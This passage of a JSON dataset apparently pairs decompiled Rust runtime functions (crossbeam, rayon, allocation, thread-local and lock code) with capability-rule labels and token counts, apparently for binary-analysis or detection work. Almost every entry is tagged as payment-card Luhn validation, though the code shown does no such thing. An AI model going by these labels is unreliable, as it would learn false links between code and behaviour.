        "decompiled_code": "\nvoid sym._crossbeam_epoch::internal::Bag_as_core::default::Default_::default::hc63a9d19129ba85c(int64_t arg1)\n\n{\n    int64_t iVar1;\n    uint auStack2056 [512];\n    \n    // <crossbeam_epoch::internal::Bag as core::default::Default>::default::hc63a9d19129ba85c\n    for (iVar1 = 0; iVar1 != 0x800; iVar1 = iVar1 + 0x20) {\n        *(auStack2056 + iVar1 + 0x10) = *0x445b78;\n        *(auStack2056 + iVar1 + 0x14) = *0x445b7c;\n        *(auStack2056 + iVar1 + 0x18) = *0x445b80;\n        *(auStack2056 + iVar1 + 0x1c) = *0x445b84;\n        *(auStack2056 + iVar1) = *0x445b68;\n        *(auStack2056 + iVar1 + 4) = *0x445b6c;\n        *(auStack2056 + iVar1 + 8) = *0x445b70;\n        *(auStack2056 + iVar1 + 0xc) = *0x445b74;\n    }\n    sym.memcpy(arg1, auStack2056, 0x800);\n    *(arg1 + 0x800) = 0;\n    return;\n}\n",
        "token_count": 328
    },
    "7452b9ad": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar sym.core::ops::function::FnOnce::call_once_u7b__u7b_vtableshim_u7d__u7d_::h7452b9ad64fd82e2(ulong arg1)\n\n{\n    // core::ops::function::FnOnce::call_once$u7b$$u7b$vtableshim$u7d$$u7d$::h7452b9ad64fd82e2\n    sym.once_cell::imp::OnceCell_T_::initialize::__u7b__u7b_closure_u7d__u7d_::hc50a215fac5a7fba(arg1);\n    return 1;\n}\n",
        "token_count": 148
    },
    "a737541a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym._ZN3std10sys_common16thread_local_key9StaticKey3key17ha737541a6eb9c428E.120(int64_t *arg1)\n\n{\n    if (*arg1 == 0) {\n        dbg.lazy_init(arg1);\n    }\n    return;\n}\n",
        "token_count": 63
    },
    "e6b64aa6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "set thread local storage value"
        ],
        "decompiled_code": "\nvoid sym.std::thread::local::os::destroy_value::he6b64aa692620d96(int64_t arg1)\n\n{\n    ulong arg1_00;\n    uint uVar1;\n    \n    // std::thread::local::os::destroy_value::he6b64aa692620d96\n    arg1_00 = *(arg1 + 0x10);\n    sym._ZN3std10sys_common16thread_local_key9StaticKey3set17hb8e9483efec9e5adE.118(arg1_00, 1);\n    sym.core::ptr::drop_in_place_core::option::Option_crossbeam_epoch::collector::LocalHandle__::heb58acba52a62f7a(arg1)\n    ;\n    sym.__rust_dealloc(arg1, 8);\n    uVar1 = sym._ZN3std10sys_common16thread_local_key9StaticKey3key17ha737541a6eb9c428E.120(arg1_00);\n    // WARNING: Could not recover jumptable at 0x00441094. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_TlsSetValue)(uVar1, 0);\n    return;\n}\n",
        "token_count": 272
    },
    "d38d3c93": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym._ZN5alloc5alloc6Global10alloc_impl17hd38d3c93a0ea2d69E.123(int64_t arg1, ulong arg2)\n\n{\n    if (arg1 != 0) {\n        sym.__rust_alloc(arg1, arg2);\n    }\n    return;\n}\n",
        "token_count": 68
    },
    "1e00ae32": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t sym._ZN4core5slice5index77__LT_impl_u20_core..ops..index..IndexMut_LT_I_GT__u20_for_u20__u5b_T_u5d__GT_9index_mut17h1e00ae32d9db78\n                  (int64_t arg1, uint64_t arg2, uint64_t arg3)\n\n{\n    if (arg3 <= arg2) {\n        return arg1 + arg3 * 4;\n    }\n    dbg.slice_start_index_len_fail(arg3, arg2);\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 134
    },
    "f1353b16": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t sym.core::slice::index::__impl_core::ops::index::Index_I__for__T__::index::hf1353b16eb9f7dff\n                  (int64_t arg1, uint64_t arg2, uint64_t arg3, uint64_t arg4)\n\n{\n    // core::slice::index::_<impl core::ops::index::Index<I> for [T]>::index::hf1353b16eb9f7dff\n    if (arg4 < arg3) {\n        dbg.slice_index_order_fail(arg3, arg4);\n        do {\n            invalidInstructionException();\n        } while( true );\n    }\n    if (arg4 <= arg2) {\n        return arg1 + arg3;\n    }\n    dbg.slice_end_index_len_fail(arg4, arg2);\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 189
    },
    "5800c158": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t sym._ZN4core5slice5index77__LT_impl_u20_core..ops..index..IndexMut_LT_I_GT__u20_for_u20__u5b_T_u5d__GT_9index_mut17h5800c158ed6c94\n                  (int64_t arg1, uint64_t arg2, uint64_t arg3, uint64_t arg4)\n\n{\n    if (arg4 < arg3) {\n        dbg.slice_index_order_fail(arg3, arg4);\n        do {\n            invalidInstructionException();\n        } while( true );\n    }\n    if (arg4 <= arg2) {\n        return arg1 + arg3;\n    }\n    dbg.slice_end_index_len_fail(arg4, arg2);\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 174
    },
    "c9c20ce1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.alloc::raw_vec::RawVec_T_A_::reserve_for_push::hc9c20ce1ceee53c1(ulong arg1, int64_t arg2)\n\n{\n    ulong arg1_00;\n    \n    // alloc::raw_vec::RawVec<T,A>::reserve_for_push::hc9c20ce1ceee53c1\n    arg1_00 = sym.alloc::raw_vec::RawVec_T_A_::grow_amortized::h209ca700d3c2e5e6(arg1, arg2, 1);\n    if (arg2 == -0x7fffffffffffffff) {\n        return;\n    }\n    if (arg2 == 0) {\n        sym.alloc::raw_vec::capacity_overflow::hf906fa3dbddee2ea();\n        do {\n            invalidInstructionException();\n        } while( true );\n    }\n    dbg.handle_alloc_error(arg1_00);\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 211
    },
    "33ad435c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.alloc::raw_vec::RawVec_T_A_::reserve_for_push::h33ad435c42ac6d3a(ulong arg1, int64_t arg2)\n\n{\n    ulong arg1_00;\n    \n    // alloc::raw_vec::RawVec<T,A>::reserve_for_push::h33ad435c42ac6d3a\n    arg1_00 = sym.alloc::raw_vec::RawVec_T_A_::grow_amortized::h635adc2ea036215c(arg1, arg2, 1);\n    if (arg2 == -0x7fffffffffffffff) {\n        return;\n    }\n    if (arg2 == 0) {\n        sym.alloc::raw_vec::capacity_overflow::hf906fa3dbddee2ea();\n        do {\n            invalidInstructionException();\n        } while( true );\n    }\n    dbg.handle_alloc_error(arg1_00);\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 207
    },
    "58206779": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.alloc::raw_vec::RawVec_T_A_::reserve_for_push::h58206779cb33cd4e(ulong arg1, int64_t arg2)\n\n{\n    ulong arg1_00;\n    \n    // alloc::raw_vec::RawVec<T,A>::reserve_for_push::h58206779cb33cd4e\n    arg1_00 = sym.alloc::raw_vec::RawVec_T_A_::grow_amortized::h759dfdd931a2252f(arg1, arg2, 1);\n    if (arg2 == -0x7fffffffffffffff) {\n        return;\n    }\n    if (arg2 == 0) {\n        sym.alloc::raw_vec::capacity_overflow::hf906fa3dbddee2ea();\n        do {\n            invalidInstructionException();\n        } while( true );\n    }\n    dbg.handle_alloc_error(arg1_00);\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 204
    },
    "9349ff97": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t sym.crossbeam_deque::deque::Buffer_T_::alloc::h9349ff97b3f5150f(uint64_t arg1)\n\n{\n    ulong arg1_00;\n    int64_t iVar1;\n    \n    // crossbeam_deque::deque::Buffer<T>::alloc::h9349ff97b3f5150f\n    if (arg1 == 0) {\n        iVar1 = 8;\n    }\n    else {\n        arg1_00 = SUB168(ZEXT816(arg1) * ZEXT816(0x10), 0);\n        if (SUB168(ZEXT816(arg1) * ZEXT816(0x10) >> 0x40, 0) != 0) {\n            sym.alloc::raw_vec::capacity_overflow::hf906fa3dbddee2ea();\n            do {\n                invalidInstructionException();\n            } while( true );\n        }\n        iVar1 = sym._ZN63__LT_alloc..alloc..Global_u20_as_u20_core..alloc..Allocator_GT_8allocate17h329e772386956f35E.185\n                          (arg1_00, 8);\n        if (iVar1 == 0) {\n            dbg.handle_alloc_error(arg1_00);\n            do {\n                invalidInstructionException();\n            } while( true );\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 291
    },
    "4b2bba14": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym._T_as_crossbeam_epoch::atomic::Pointable_::init::h4b2bba14c22a45c9(ulong arg1, ulong arg2)\n\n{\n    ulong *puVar1;\n    \n    // <T as crossbeam_epoch::atomic::Pointable>::init::h4b2bba14c22a45c9\n    puVar1 = sym._ZN5alloc5alloc15exchange_malloc17h9d5ddd9e636df918E.184(0x10, 8);\n    *puVar1 = arg1;\n    puVar1[1] = arg2;\n    return;\n}\n",
        "token_count": 140
    },
    "1b11b86e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong * sym.alloc::sync::Arc_T_::new::h1b11b86e4acc484c(ulong s2)\n\n{\n    ulong *puVar1;\n    uchar auStack376 [112];\n    uchar auStack264 [256];\n    \n    // alloc::sync::Arc<T>::new::h1b11b86e4acc484c\n    sym.memcpy(auStack264, s2, 0x100);\n    puVar1 = sym._ZN5alloc5alloc15exchange_malloc17h9d5ddd9e636df918E.184(0x180, 0x80);\n    *puVar1 = 1;\n    puVar1[1] = 1;\n    sym.memcpy(puVar1 + 2, auStack376, 0x170);\n    return puVar1;\n}\n",
        "token_count": 182
    },
    "d082a672": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym._crossbeam_deque::deque::Injector_T__as_core::default::Default_::default::hd082a672e925602a(ulong *arg1)\n\n{\n    ulong uVar1;\n    uchar auStack1544 [1520];\n    \n    // <crossbeam_deque::deque::Injector<T> as core::default::Default>::default::hd082a672e925602a\n    sym.crossbeam_deque::deque::Block_T_::new::ha870a499814eac98(auStack1544);\n    uVar1 = sym._ZN5alloc5alloc15exchange_malloc17h9d5ddd9e636df918E.184(0x5f0, 8);\n    sym.memcpy(uVar1, auStack1544, 0x5f0);\n    *arg1 = 0;\n    arg1[1] = uVar1;\n    arg1[0x10] = 0;\n    arg1[0x11] = uVar1;\n    return;\n}\n",
        "token_count": 223
    },
    "a870a499": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.crossbeam_deque::deque::Block_T_::new::ha870a499814eac98(ulong *s1)\n\n{\n    int64_t iVar1;\n    uchar auStack1512 [16];\n    ulong auStack1496 [187];\n    \n    // crossbeam_deque::deque::Block<T>::new::ha870a499814eac98\n    for (iVar1 = 0; iVar1 != 0x5e8; iVar1 = iVar1 + 0x18) {\n        *(auStack1512 + iVar1) = ZEXT816(0);\n        *(auStack1496 + iVar1) = 0;\n    }\n    *s1 = 0;\n    sym.memcpy(s1 + 1, auStack1512, 0x5e8);\n    return;\n}\n",
        "token_count": 178
    },
    "365a3891": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t sym.crossbeam_epoch::default::pin::h365a3891add9bf07(void)\n\n{\n    uint64_t *puVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    int64_t *piVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    ulong uStack24;\n    \n    // crossbeam_epoch::default::pin::h365a3891add9bf07\n    piVar4 = sym.crossbeam_epoch::default::HANDLE::__getit::h9143a98e54b6306a();\n    if (piVar4 == NULL) {\n        sym.once_cell::sync::Lazy_T_F_::force::h568fdafcba663bad();\n        uStack24 = sym.crossbeam_epoch::collector::Collector::register::hb5d3f69dce6e9b03();\n        iVar5 = sym.crossbeam_epoch::default::pin::__u7b__u7b_closure_u7d__u7d_::h615ccea438666dd4(&uStack24);\n        sym.core::ptr::drop_in_place_crossbeam_epoch::collector::LocalHandle_::h45c2ac2238b86eb3(&uStack24);\n        return iVar5;\n    }\n    iVar5 = *piVar4;\n    iVar2 = *(iVar5 + 0x820);\n    iVar6 = iVar2 + 1;\n    if (iVar6 != 0) {\n        *(iVar5 + 0x820) = iVar6;\n        if (iVar2 == 0) {\n            LOCK();\n            puVar1 = iVar5 + 8;\n            *puVar1 = *puVar1 ^ (*puVar1 == 0) * (*puVar1 ^ (*(*(iVar5 + 0x10) + 0x180) | 1));\n            uVar3 = *(iVar5 + 0x830);\n            *(iVar5 + 0x830) = uVar3 + 1;\n            if ((uVar3 & 0x7f) == 0) {\n                sym.crossbeam_epoch::internal::Global::collect::h6708353a970a45c2(*(iVar5 + 0x10) + 0x80);\n            }\n        }\n        return iVar5;\n    }\n    dbg.panic(0x44bcbb, 0x2b, 0x448598);\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 536
    },
    "615ccea4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t sym.crossbeam_epoch::default::pin::__u7b__u7b_closure_u7d__u7d_::h615ccea438666dd4(int64_t *arg1)\n\n{\n    uint64_t *puVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    int64_t iVar5;\n    \n    // crossbeam_epoch::default::pin::_$u7b$$u7b$closure$u7d$$u7d$::h615ccea438666dd4\n    iVar2 = *arg1;\n    iVar3 = *(iVar2 + 0x820);\n    iVar5 = iVar3 + 1;\n    if (iVar5 != 0) {\n        *(iVar2 + 0x820) = iVar5;\n        if (iVar3 == 0) {\n            LOCK();\n            puVar1 = iVar2 + 8;\n            *puVar1 = *puVar1 ^ (*puVar1 == 0) * (*puVar1 ^ (*(*(iVar2 + 0x10) + 0x180) | 1));\n            uVar4 = *(iVar2 + 0x830);\n            *(iVar2 + 0x830) = uVar4 + 1;\n            if ((uVar4 & 0x7f) == 0) {\n                sym.crossbeam_epoch::internal::Global::collect::h6708353a970a45c2(*(iVar2 + 0x10) + 0x80);\n            }\n        }\n        return iVar2;\n    }\n    dbg.panic(0x44bcbb, 0x2b, 0x448598);\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 384
    },
    "654fa38a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym._rayon_core::latch::LockLatch_as_rayon_core::latch::Latch_::set::h654fa38a163bd2fb(int64_t arg1)\n\n{\n    int64_t iStack56;\n    uchar uStack48;\n    uchar auStack40 [24];\n    \n    // <rayon_core::latch::LockLatch as rayon_core::latch::Latch>::set::h654fa38a163bd2fb\n    sym.std::sync::mutex::Mutex_T_::lock::h62098323f0fb8253(auStack40, arg1);\n    uStack48 = 0x90;\n    iStack56 = sym.core::result::Result_T_E_::unwrap::h275888c52c276ebd(auStack40, 0x44be90);\n    *(iStack56 + 9) = 1;\n    sub.KERNEL32.dll_WakeAllConditionVariable(arg1 + 0x10);\n    sym.core::ptr::drop_in_place_std::sync::mutex::MutexGuard_bool__::h1d527a45e74a1c46(&iStack56);\n    return;\n}\n",
        "token_count": 251
    },
    "79661f8f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym._crossbeam_deque::deque::Injector_T__as_core::ops::drop::Drop_::drop::h79661f8f1cce177b(uint64_t *arg1)\n\n{\n    uint64_t uVar1;\n    uint64_t **arg1_00;\n    uint64_t **ppuVar2;\n    uint64_t uVar3;\n    \n    // <crossbeam_deque::deque::Injector<T> as core::ops::drop::Drop>::drop::h79661f8f1cce177b\n    uVar1 = arg1[0x10];\n    arg1_00 = arg1[1];\n    for (uVar3 = *arg1 & 0xfffffffffffffffe; (uVar1 & 0xfffffffffffffffe) != uVar3; uVar3 = uVar3 + 2) {\n        ppuVar2 = arg1_00;\n        if ((~uVar3 & 0x7e) == 0) {\n            ppuVar2 = *arg1_00;\n            sym.core::mem::drop::h23fcfad6ef128444(arg1_00);\n        }\n        arg1_00 = ppuVar2;\n    }\n    sym._ZN4core3ptr106drop_in_place_LT_alloc..boxed..Box_LT_crossbeam_deque..deque..Block_LT_rayon_core..job..JobRef_GT__GT__GT_17hc0\n              (&stack0xfffffffffffffff8);\n    return;\n}\n",
        "token_count": 320
    },
    "23fcfad6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.core::mem::drop::h23fcfad6ef128444(ulong arg1)\n\n{\n    ulong uStack8;\n    \n    // core::mem::drop::h23fcfad6ef128444\n    uStack8 = arg1;\n    sym._ZN4core3ptr106drop_in_place_LT_alloc..boxed..Box_LT_crossbeam_deque..deque..Block_LT_rayon_core..job..JobRef_GT__GT__GT_17hc0\n              (&uStack8);\n    return;\n}\n",
        "token_count": 111
    },
    "a24e02ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.alloc::sync::Arc_T_::drop_slow::ha24e02ecb32d4472(int64_t *arg1)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    uchar auVar3 [16];\n    int64_t iVar4;\n    int64_t iVar5;\n    \n    // alloc::sync::Arc<T>::drop_slow::ha24e02ecb32d4472\n    iVar2 = *arg1;\n    sym.core::ptr::drop_in_place_rayon_core::log::Logger_::h0afe3a00b5929015(iVar2 + 0x180);\n    iVar4 = *(iVar2 + 400);\n    for (iVar5 = *(iVar2 + 0x1a0) * 0x50; iVar5 != 0; iVar5 = iVar5 + -0x50) {\n        sym._ZN4core3ptr155drop_in_place_LT_alloc..sync..Arc_LT_crossbeam_utils..cache_padded..CachePadded_LT_crossbeam_deque..deque..Inne\n                  (iVar4 + 0x40);\n        iVar4 = iVar4 + 0x50;\n    }\n    if ((*(iVar2 + 0x198) != 0) && (auVar3 = ZEXT816(*(iVar2 + 0x198)) * ZEXT816(0x50),  SUB168(auVar3 >> 0x40, 0) == 0)\n       ) {\n        sym._ZN63__LT_alloc..alloc..Global_u20_as_u20_core..alloc..Allocator_GT_10deallocate17h82f390f816a480d0E.187\n                  (*(iVar2 + 400), SUB168(auVar3, 0), 8);\n    }\n    sym.core::ptr::drop_in_place_rayon_core::log::Logger_::h0afe3a00b5929015(iVar2 + 0x1a8);\n    if ((*(iVar2 + 0x1c0) != 0) && (auVar3 = ZEXT816(*(iVar2 + 0x1c0)) * ZEXT816(0x80),  SUB168(auVar3 >> 0x40, 0) == 0)\n       ) {\n        sym._ZN63__LT_alloc..alloc..Global_u20_as_u20_core..alloc..Allocator_GT_10deallocate17h82f390f816a480d0E.187\n                  (*(iVar2 + 0x1b8), SUB168(auVar3, 0), 0x80);\n    }\n    sym._crossbeam_deque::deque::Injector_T__as_core::ops::drop::Drop_::drop::h79661f8f1cce177b(iVar2 + 0x80);\n    sym._ZN4core3ptr274drop_in_place_LT_core..option..Option_LT_alloc..boxed..Box_LT_dyn_u20_core..ops..function..Fn_LT__LP_alloc..box\n              (iVar2 + 0x1d8);\n    sym._ZN4core3ptr209drop_in_place_LT_core..option..Option_LT_alloc..boxed..Box_LT_dyn_u20_core..ops..function..Fn_LT__LP_usize_C__R\n              (iVar2 + 0x1e8);\n    sym._ZN4core3ptr209drop_in_place_LT_core..option..Option_LT_alloc..boxed..Box_LT_dyn_u20_core..ops..function..Fn_LT__LP_usize_C__R\n              (iVar2 + 0x1f8);\n    if (iVar2 != -1) {\n        LOCK();\n        piVar1 = iVar2 + 8;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 == 0) {\n    // WARNING: Could not recover jumptable at 0x00441124. Too many branches\n    // WARNING: Treating indirect jump as call\n            (*_sym.imp.KERNEL32.dll_HeapFree)(*0x4520e0, 0, *(iVar2 + -8));\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 900
    },
    "9479c77d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404d59)\n\nvoid sym.core::ptr::drop_in_place_crossbeam_channel::waker::Waker_::h9479c77d2c1c42a8(int64_t arg1)\n\n{\n    uchar auVar1 [16];\n    \n    // core::ptr::drop_in_place<crossbeam_channel::waker::Waker>::h9479c77d2c1c42a8\n    sym.core::ptr::drop_in_place_alloc::vec::Vec_crossbeam_channel::waker::Entry__::h8bc0bda15236b7d5(arg1);\n    sym.core::ptr::drop_in_place__crossbeam_channel::waker::Entry__::hc74945c7293ead95(*(arg1 + 0x18));\n    if ((*(arg1 + 0x20) != 0) && (auVar1 = ZEXT816(*(arg1 + 0x20)) * ZEXT816(0x18),  SUB168(auVar1 >> 0x40, 0) == 0)) {\n        if (SUB168(auVar1, 0) == 0) {\n            return;\n        }\n    // WARNING: Could not recover jumptable at 0x00441124. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*_sym.imp.KERNEL32.dll_HeapFree)(*0x4520e0, 0, *(arg1 + 0x18));\n        return;\n    }\n    return;\n}\n",
        "token_count": 337
    },
    "8bc0bda1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404d59)\n\nvoid sym.core::ptr::drop_in_place_alloc::vec::Vec_crossbeam_channel::waker::Entry__::h8bc0bda15236b7d5(ulong *arg1)\n\n{\n    uchar auVar1 [16];\n    \n    // core::ptr::drop_in_place<alloc::vec::Vec<crossbeam_channel::waker::Entry>>::h8bc0bda15236b7d5\n    sym.core::ptr::drop_in_place__crossbeam_channel::waker::Entry__::hc74945c7293ead95(*arg1);\n    if ((arg1[1] != 0) && (auVar1 = ZEXT816(arg1[1]) * ZEXT816(0x18),  SUB168(auVar1 >> 0x40, 0) == 0)) {\n        if (SUB168(auVar1, 0) == 0) {\n            return;\n        }\n    // WARNING: Could not recover jumptable at 0x00441124. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*_sym.imp.KERNEL32.dll_HeapFree)(*0x4520e0, 0, *arg1);\n        return;\n    }\n    return;\n}\n",
        "token_count": 287
    },
    "c74945c7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.core::ptr::drop_in_place__crossbeam_channel::waker::Entry__::hc74945c7293ead95(int64_t arg1)\n\n{\n    int64_t in_RDX;\n    int64_t iVar1;\n    \n    // core::ptr::drop_in_place<[crossbeam_channel::waker::Entry]>::hc74945c7293ead95\n    for (iVar1 = in_RDX * 0x18; iVar1 != 0; iVar1 = iVar1 + -0x18) {\n        sym.core::ptr::drop_in_place_crossbeam_channel::waker::Entry_::hf56abe6238347ed5(arg1);\n        arg1 = arg1 + 0x18;\n    }\n    return;\n}\n",
        "token_count": 162
    },
    "f56abe62": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404d59)\n\nvoid sym.core::ptr::drop_in_place_crossbeam_channel::waker::Entry_::hf56abe6238347ed5(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int64_t *piVar2;\n    \n    // core::ptr::drop_in_place<crossbeam_channel::waker::Entry>::hf56abe6238347ed5\n    piVar2 = *(arg1 + 0x10);\n    LOCK();\n    *piVar2 = *piVar2 + -1;\n    if (*piVar2 != 0) {\n        return;\n    }\n    iVar1 = *(arg1 + 0x10);\n    piVar2 = *(iVar1 + 0x20);\n    LOCK();\n    *piVar2 = *piVar2 + -1;\n    if (*piVar2 == 0) {\n        sym.alloc::sync::Arc_T_::drop_slow::hb3d3773341c3a41a(iVar1 + 0x20);\n    }\n    if (iVar1 != -1) {\n        LOCK();\n        piVar2 = iVar1 + 8;\n        *piVar2 = *piVar2 + -1;\n        if (*piVar2 == 0) {\n    // WARNING: Could not recover jumptable at 0x00441124. Too many branches\n    // WARNING: Treating indirect jump as call\n            (*_sym.imp.KERNEL32.dll_HeapFree)(*0x4520e0, 0, iVar1);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 352
    },
    "815c327c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym._ZN4core3ptr96drop_in_place_LT_std..sync..mutex..MutexGuard_LT_crossbeam_channel..flavors..zero..Inner_GT__GT_17h815c327c037ed\n               (int64_t *arg1)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = *arg1;\n    sym._ZN3std4sync6poison4Flag4done17h294739ef4dc167d0E.193(iVar1 + 8);\n    // WARNING: Could not recover jumptable at 0x004410d4. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_ReleaseSRWLockExclusive)(iVar1);\n    return;\n}\n",
        "token_count": 163
    },
    "294739ef": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym._ZN3std4sync6poison4Flag4done17h294739ef4dc167d0E.193(uchar *arg1)\n\n{\n    char cVar1;\n    char in_DL;\n    \n    if (in_DL == '\\0') {\n        cVar1 = sym._ZN3std6thread9panicking17h4d36ec2cb47eacaeE.194();\n        if (cVar1 != '\\0') {\n            *arg1 = 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 116
    },
    "2a63bb5c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.crossbeam_channel::context::Context::unpark::h2a63bb5c50780db0(int64_t *arg1)\n\n{\n    char cVar1;\n    uint64_t uVar2;\n    char *pcVar3;\n    uint64_t uVar4;\n    bool bVar5;\n    int32_t iStack92;\n    uint64_t uStack88;\n    int32_t *piStack80;\n    code *pcStack72;\n    ulong uStack64;\n    ulong uStack56;\n    ulong uStack48;\n    int32_t **ppiStack32;\n    ulong uStack24;\n    \n    // crossbeam_channel::context::Context::unpark::h2a63bb5c50780db0\n    pcVar3 = *(*arg1 + 0x20) + 0x28;\n    cVar1 = *pcVar3;\n    *pcVar3 = '\\x01';\n    if (cVar1 == -1) {\n        if (*0x4520f8 != NULL) {\n    // WARNING: Could not recover jumptable at 0x0043acbd. Too many branches\n    // WARNING: Treating indirect jump as call\n            (**0x4520f8)(pcVar3);\n            return;\n        }\n        uVar4 = *0x443088;\n        if (*0x443088 == 0xffffffffffffffff) {\n            uStack88 = 0xffffffffffffffff;\n            iStack92 = (**0x4430b0)(&uStack88, 0xc0000000, 0, 0);\n            if (iStack92 != 0) {\n                piStack80 = &iStack92;\n                pcStack72 = sym.core::fmt::num::imp::__impl_core::fmt::Display_for_i32_::fmt::hff6e31fbf33ddf61;\n                uStack64 = 0x44b4b8;\n                uStack56 = 1;\n                uStack48 = 0;\n                ppiStack32 = &piStack80;\n                uStack24 = 1;\n                dbg.panic_fmt(&uStack64, 0x44b4f8);\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            LOCK();\n            bVar5 = *0x443088 == 0xffffffffffffffff;\n            *0x443088 = *0x443088 ^ bVar5 * (*0x443088 ^ uStack88);\n            uVar2 = *0x443088 ^ 0xffffffffffffffff;\n            uVar4 = uStack88;\n            if (!bVar5) {\n                sub.KERNEL32.dll_CloseHandle();\n                uVar4 = !bVar5 * uVar2 ^ 0xffffffffffffffff;\n            }\n        }\n        (**0x4430b8)(uVar4, pcVar3, 0, 0);\n    }\n    return;\n}\n",
        "token_count": 625
    },
    "7c1dc4a1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
